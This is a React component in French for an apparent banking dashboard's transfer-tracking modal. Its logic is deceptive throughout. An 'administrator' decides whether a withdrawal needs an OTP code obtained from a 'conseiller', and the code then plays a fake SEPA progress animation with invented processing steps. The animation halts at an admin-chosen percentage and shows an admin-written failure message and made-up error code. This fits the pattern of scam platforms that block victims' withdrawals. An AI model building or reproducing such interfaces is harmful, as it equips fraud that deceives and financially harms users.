"use client";

import { useEffect, useState, useRef } from "react";

interface TransferInfo {
  id: string;
  recipientName: string;
  iban: string;
  bic: string;
  amountCents: number;
  description?: string;
  status: string;
  requiresOtp: boolean;
  createdAt: string;
}

interface TransferTrackingModalProps {
  transferId: string;
  onClose: () => void;
  onSuccessOrHalted?: () => void;
}

export default function TransferTrackingModal({
  transferId,
  onClose,
  onSuccessOrHalted,
}: TransferTrackingModalProps) {
  const [transfer, setTransfer] = useState<TransferInfo | null>(null);
  const [loading, setLoading] = useState(true);
  const [phase, setPhase] = useState<"waiting_admin" | "otp_required" | "running_progress" | "halted_error">("waiting_admin");

  // Code OTP input
  const [otpCode, setOtpCode] = useState("");
  const [submittingCode, setSubmittingCode] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  // Progress simulation
  const [progress, setProgress] = useState(0);
  const [progressText, setProgressText] = useState("Connexion au réseau bancaire SEPA…");
  const [haltPercent, setHaltPercent] = useState(50);
  const [finalHaltMessage, setFinalHaltMessage] = useState("");
  const [errorCode, setErrorCode] = useState("");

  const pollIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Charger les infos du virement
  const fetchTransferStatus = async () => {
    try {
      const res = await fetch(`/api/dashboard/transactions/${transferId}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.success && data.transfer) {
        setTransfer(data.transfer);
        setLoading(false);

        // Si l'admin a configuré le blocage (requiresOtp === true ou status === 'pending_otp')
        if (data.transfer.status === "pending_otp" || data.transfer.requiresOtp) {
          setPhase((prev) => (prev === "waiting_admin" ? "otp_required" : prev));
        } else if (data.transfer.status === "blocked_at_routing") {
          // Déjà bloqué précédemment
          setHaltPercent(50);
          setFinalHaltMessage("Ce virement a été interrompu par le protocole de sécurité bancaire. Veuillez contacter votre gestionnaire.");
          setPhase("halted_error");
        }
      }
    } catch (e) {
      console.error("Erreur chargement virement :", e);
    }
  };

  useEffect(() => {
    fetchTransferStatus();

    // Polling toutes les 3 secondes tant qu'on est en attente de l'admin
    pollIntervalRef.current = setInterval(() => {
      fetchTransferStatus();
    }, 3000);

    return () => {
      if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
    };
  }, [transferId]);

  // Si on quitte la phase waiting_admin, couper le polling
  useEffect(() => {
    if (phase !== "waiting_admin" && pollIntervalRef.current) {
      clearInterval(pollIntervalRef.current);
      pollIntervalRef.current = null;
    }
  }, [phase]);

  // Soumission du code tapé par l'utilisateur
  const handleValidateCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otpCode.trim().length !== 6) {
      setErrorMessage("Veuillez saisir le code complet à 6 chiffres.");
      return;
    }

    setSubmittingCode(true);
    setErrorMessage("");

    try {
      const res = await fetch("/api/dashboard/transactions/withdraw-confirm", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          requestId: transferId,
          otpCode: otpCode.trim(),
        }),
      });

      const data = await res.json();
      if (!res.ok || !data.success) {
        setErrorMessage(data.message || "Code incorrect. Veuillez vérifier auprès de votre gestionnaire.");
        setSubmittingCode(false);
        return;
      }

      // Succès de la vérification du code : lancer l'animation jusqu'au pourcentage de l'admin !
      const targetPercent = data.haltAtPercent || 50;
      setHaltPercent(targetPercent);
      setFinalHaltMessage(data.haltMessage || "Une erreur est survenue, veuillez contacter votre gestionnaire ou bien tentez à nouveau plus tard.");
      setErrorCode(data.errorCode || `ERR_SEPA_${targetPercent}`);

      setPhase("running_progress");
      startProgressAnimation(targetPercent);
    } catch {
      setErrorMessage("Erreur de connexion. Veuillez réessayer.");
      setSubmittingCode(false);
    }
  };

  // Animation fluide du loader de 0% jusqu'à targetPercent, puis arrêt net
  const startProgressAnimation = (targetPercent: number) => {
    setProgress(0);
    let current = 0;

    const interval = setInterval(() => {
      const p1 = Math.round(targetPercent * 0.25);
      const p2 = Math.round(targetPercent * 0.55);
      const p3 = Math.round(targetPercent * 0.85);

      if (current < p1) {
        current += 1;
        setProgress(current);
        setProgressText("Connexion sécurisée au réseau interbancaire SEPA…");
      } else if (current < p2) {
        current += 1;
        setProgress(current);
        setProgressText("Vérification des certificats et protocoles bancaires…");
      } else if (current < p3) {
        current += 1;
        setProgress(current);
        setProgressText("Routage du flux vers l'établissement destinataire…");
      } else if (current < targetPercent) {
        current += 1;
        setProgress(current);
        setProgressText("Finalisation de la compensation interbancaire…");
      } else {
        clearInterval(interval);
        setProgress(targetPercent);
        setPhase("halted_error");
        if (onSuccessOrHalted) onSuccessOrHalted();
      }
    }, 85);
  };

  const amountDisplay = transfer ? (transfer.amountCents / 100).toFixed(2) + " €" : "— €";

  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        background: "rgba(3, 7, 18, 0.85)",
        backdropFilter: "blur(8px)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        zIndex: 9999,
        padding: "1rem",
      }}
    >
      <div
        style={{
          background: "linear-gradient(145deg, #0f172a, #0b1120)",
          border: "1px solid rgba(255, 255, 255, 0.12)",
          borderRadius: "24px",
          width: "100%",
          maxWidth: "480px",
          padding: "2rem 1.75rem",
          color: "#fff",
          boxShadow: "0 25px 60px -15px rgba(0, 0, 0, 0.8), 0 0 40px rgba(59, 130, 246, 0.15)",
          textAlign: "center",
          position: "relative",
          animation: "scaleIn 0.25s cubic-bezier(0.16, 1, 0.3, 1)",
        }}
      >
        {/* Bouton Fermer */}
        <button
          onClick={onClose}
          type="button"
          style={{
            position: "absolute",
            top: "1.25rem",
            right: "1.25rem",
            background: "rgba(255, 255, 255, 0.08)",
            border: "none",
            borderRadius: "50%",
            width: "34px",
            height: "34px",
            color: "#94a3b8",
            cursor: "pointer",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            fontSize: "1rem",
            transition: "all 0.2s",
          }}
        >
          ✕
        </button>

        {/* Détails du virement */}
        <div style={{ marginBottom: "1.5rem" }}>
          <span
            style={{
              fontSize: "0.75rem",
              textTransform: "uppercase",
              letterSpacing: "1.5px",
              color: "#60a5fa",
              fontWeight: 700,
            }}
          >
            VIREMENT BANCAIRE
          </span>
          <h2 style={{ fontSize: "1.6rem", fontWeight: 800, margin: "0.35rem 0" }}>
            {amountDisplay}
          </h2>
          <p style={{ color: "#94a3b8", fontSize: "0.85rem", margin: 0 }}>
            Vers : <strong>{transfer?.recipientName || "Bénéficiaire"}</strong>
          </p>
        </div>

        {/* ================= ÉTAT 1 : EN ATTENTE DE L'ADMIN ================= */}
        {phase === "waiting_admin" && (
          <div style={{ padding: "1rem 0" }}>
            {/* Grand Loader qui tourne */}
            <div style={{ position: "relative", width: "130px", height: "130px", margin: "0 auto 1.5rem" }}>
              <div
                style={{
                  width: "100%",
                  height: "100%",
                  borderRadius: "50%",
                  border: "4px solid rgba(59, 130, 246, 0.15)",
                  borderTopColor: "#3b82f6",
                  borderRightColor: "#60a5fa",
                  animation: "spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite",
                }}
              />
              <div
                style={{
                  position: "absolute",
                  inset: "15px",
                  borderRadius: "50%",
                  border: "3px dashed rgba(147, 51, 234, 0.3)",
                  borderBottomColor: "#a855f7",
                  animation: "spinReverse 3s linear infinite",
                }}
              />
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: "1.6rem",
                  color: "#3b82f6",
                }}
              >
                ⏳
              </div>
            </div>

            <div
              style={{
                display: "inline-block",
                background: "rgba(234, 179, 8, 0.15)",
                color: "#eab308",
                border: "1px solid rgba(234, 179, 8, 0.3)",
                padding: "0.35rem 1rem",
                borderRadius: "20px",
                fontWeight: 800,
                fontSize: "0.95rem",
                letterSpacing: "0.5px",
                marginBottom: "1rem",
              }}
            >
              ● EN ATTENTE
            </div>

            <p style={{ color: "#cbd5e1", fontSize: "0.9rem", lineHeight: 1.5, margin: "0 auto", maxWidth: "360px" }}>
              Votre virement est actuellement en attente de vérification par les systèmes de sécurité bancaires. Veuillez patienter…
            </p>

            <div
              style={{
                marginTop: "1.5rem",
                padding: "0.75rem 1rem",
                background: "rgba(255, 255, 255, 0.04)",
                borderRadius: "12px",
                fontSize: "0.8rem",
                color: "#64748b",
              }}
            >
              <i className="fa-solid fa-arrows-rotate fa-spin" style={{ marginRight: "0.4rem" }}></i>
              Actualisation automatique du statut en temps réel…
            </div>
          </div>
        )}

        {/* ================= ÉTAT 2 : ADMIN A BLOQUÉ -> UTILISATEUR TAPE LE CODE ================= */}
        {phase === "otp_required" && (
          <form onSubmit={handleValidateCode} style={{ padding: "0.5rem 0" }}>
            <div
              style={{
                width: "60px",
                height: "60px",
                borderRadius: "50%",
                background: "rgba(59, 130, 246, 0.15)",
                border: "1px solid rgba(59, 130, 246, 0.3)",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                margin: "0 auto 1.25rem",
                fontSize: "1.5rem",
                color: "#60a5fa",
              }}
            >
              🔒
            </div>

            <h3 style={{ fontSize: "1.15rem", fontWeight: 700, margin: "0 0 0.5rem" }}>
              Code de confirmation requis
            </h3>
            <p style={{ color: "#94a3b8", fontSize: "0.85rem", margin: "0 auto 1.25rem", maxWidth: "360px", lineHeight: 1.4 }}>
              Veuillez saisir le code de sécurité à 6 chiffres transmis par votre conseiller / administrateur bancaire.
            </p>

            {errorMessage && (
              <div
                style={{
                  background: "rgba(239, 68, 68, 0.15)",
                  border: "1px solid rgba(239, 68, 68, 0.4)",
                  color: "#fca5a5",
                  padding: "0.6rem 0.85rem",
                  borderRadius: "10px",
                  marginBottom: "1rem",
                  fontSize: "0.85rem",
                }}
              >
                ⚠️ {errorMessage}
              </div>
            )}

            <div style={{ marginBottom: "1.5rem" }}>
              <input
                type="text"
                maxLength={6}
                autoFocus
                required
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder="••••••"
                style={{
                  width: "220px",
                  padding: "0.85rem 1rem",
                  borderRadius: "14px",
                  background: "rgba(255, 255, 255, 0.08)",
                  border: "2px solid #3b82f6",
                  color: "#fff",
                  fontSize: "1.8rem",
                  fontWeight: 800,
                  letterSpacing: "10px",
                  textAlign: "center",
                  fontFamily: "monospace",
                  outline: "none",
                  boxShadow: "0 0 20px rgba(59, 130, 246, 0.2)",
                }}
              />
            </div>

            <button
              type="submit"
              disabled={submittingCode || otpCode.length !== 6}
              style={{
                width: "100%",
                padding: "0.95rem",
                borderRadius: "14px",
                background: otpCode.length === 6 ? "linear-gradient(135deg, #3b82f6, #1d4ed8)" : "rgba(255, 255, 255, 0.1)",
                border: "none",
                color: "#fff",
                fontWeight: 700,
                fontSize: "1rem",
                cursor: otpCode.length === 6 && !submittingCode ? "pointer" : "not-allowed",
                transition: "all 0.2s",
                boxShadow: otpCode.length === 6 ? "0 10px 25px -5px rgba(59, 130, 246, 0.5)" : "none",
              }}
            >
              {submittingCode ? "Vérification en cours…" : "Continuer"}
            </button>
          </form>
        )}

        {/* ================= ÉTAT 3 : LE LOADER TOURNE JUSQU'AU POURCENTAGE DE L'ADMIN ================= */}
        {phase === "running_progress" && (
          <div style={{ padding: "1.5rem 0" }}>
            <div style={{ position: "relative", width: "150px", height: "150px", margin: "0 auto 1.5rem" }}>
              <svg width="150" height="150" viewBox="0 0 150 150">
                <circle
                  cx="75"
                  cy="75"
                  r="62"
                  fill="transparent"
                  stroke="rgba(255, 255, 255, 0.08)"
                  strokeWidth="8"
                />
                <circle
                  cx="75"
                  cy="75"
                  r="62"
                  fill="transparent"
                  stroke="#3b82f6"
                  strokeWidth="8"
                  strokeDasharray={2 * Math.PI * 62}
                  strokeDashoffset={2 * Math.PI * 62 * (1 - progress / 100)}
                  strokeLinecap="round"
                  transform="rotate(-90 75 75)"
                  style={{ transition: "stroke-dashoffset 0.1s linear" }}
                />
              </svg>
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <span style={{ fontSize: "2rem", fontWeight: 800, color: "#fff", fontFamily: "monospace" }}>
                  {progress}%
                </span>
                <span style={{ fontSize: "0.7rem", color: "#60a5fa", fontWeight: 700, textTransform: "uppercase" }}>
                  Traitement
                </span>
              </div>
            </div>

            <p style={{ color: "#93c5fd", fontSize: "0.95rem", fontWeight: 600, minHeight: "2.5rem" }}>
              {progressText}
            </p>
          </div>
        )}

        {/* ================= ÉTAT 4 : ARRÊT AU POURCENTAGE & AFFICHAGE MESSAGE D'ERREUR ================= */}
        {phase === "halted_error" && (
          <div style={{ padding: "0.5rem 0", animation: "fadeIn 0.3s ease" }}>
            {/* Cercle bloqué en rouge */}
            <div style={{ position: "relative", width: "140px", height: "140px", margin: "0 auto 1.25rem" }}>
              <svg width="140" height="140" viewBox="0 0 140 140">
                <circle
                  cx="70"
                  cy="70"
                  r="58"
                  fill="transparent"
                  stroke="rgba(239, 68, 68, 0.15)"
                  strokeWidth="8"
                />
                <circle
                  cx="70"
                  cy="70"
                  r="58"
                  fill="transparent"
                  stroke="#ef4444"
                  strokeWidth="8"
                  strokeDasharray={2 * Math.PI * 58}
                  strokeDashoffset={2 * Math.PI * 58 * (1 - haltPercent / 100)}
                  strokeLinecap="round"
                  transform="rotate(-90 70 70)"
                />
              </svg>
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <span style={{ fontSize: "1.75rem", fontWeight: 800, color: "#ef4444", fontFamily: "monospace" }}>
                  {haltPercent}%
                </span>
                <span style={{ fontSize: "0.65rem", color: "#f87171", fontWeight: 800, textTransform: "uppercase" }}>
                  Interrompu
                </span>
              </div>
            </div>

            <div
              style={{
                display: "inline-block",
                background: "rgba(239, 68, 68, 0.15)",
                color: "#ef4444",
                border: "1px solid rgba(239, 68, 68, 0.3)",
                padding: "0.3rem 0.85rem",
                borderRadius: "20px",
                fontWeight: 800,
                fontSize: "0.85rem",
                marginBottom: "1rem",
              }}
            >
              ⚠️ ÉCHEC DU VIREMENT · {haltPercent}%
            </div>

            {/* MESSAGE D'ERREUR CONFIGURÉ PAR L'ADMINISTRATEUR */}
            <div
              style={{
                background: "rgba(239, 68, 68, 0.1)",
                border: "1px solid rgba(239, 68, 68, 0.3)",
                borderRadius: "14px",
                padding: "1rem 1.25rem",
                color: "#fecaca",
                fontSize: "0.95rem",
                lineHeight: 1.5,
                marginBottom: "1.5rem",
                textAlign: "left",
              }}
            >
              <div style={{ display: "flex", gap: "0.6rem", alignItems: "flex-start" }}>
                <span style={{ fontSize: "1.2rem", color: "#ef4444", flexShrink: 0 }}>⛔</span>
                <div>
                  <strong>Opération suspendue :</strong>
                  <p style={{ margin: "0.35rem 0 0", color: "#fca5a5" }}>
                    {finalHaltMessage}
                  </p>
                  {errorCode && (
                    <span style={{ display: "block", marginTop: "0.5rem", fontSize: "0.75rem", color: "#f87171", fontFamily: "monospace" }}>
                      Réf: {errorCode}
                    </span>
                  )}
                </div>
              </div>
            </div>

            {/* Boutons d'action */}
            <div style={{ display: "flex", flexDirection: "column", gap: "0.75rem" }}>
              <a
                href="mailto:contact@cbgbanque.com?subject=Assistance%20virement%20suspendu"
                style={{
                  display: "block",
                  padding: "0.9rem",
                  borderRadius: "12px",
                  background: "linear-gradient(135deg, #ef4444, #dc2626)",
                  color: "#fff",
                  fontWeight: 700,
                  fontSize: "0.95rem",
                  textDecoration: "none",
                  textAlign: "center",
                  boxShadow: "0 10px 20px -5px rgba(239, 68, 68, 0.4)",
                }}
              >
                <i className="fa-solid fa-headset" style={{ marginRight: "0.5rem" }}></i>
                Contacter mon gestionnaire
              </a>
              <button
                type="button"
                onClick={onClose}
                style={{
                  padding: "0.8rem",
                  borderRadius: "12px",
                  background: "rgba(255, 255, 255, 0.08)",
                  border: "none",
                  color: "#94a3b8",
                  fontWeight: 600,
                  fontSize: "0.9rem",
                  cursor: "pointer",
                }}
              >
                Fermer
              </button>
            </div>
          </div>
        )}

      </div>

      <style jsx global>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes spinReverse {
          0% { transform: rotate(360deg); }
          100% { transform: rotate(0deg); }
        }
        @keyframes scaleIn {
          from { opacity: 0; transform: scale(0.95); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
      `}</style>
    </div>
  );
}
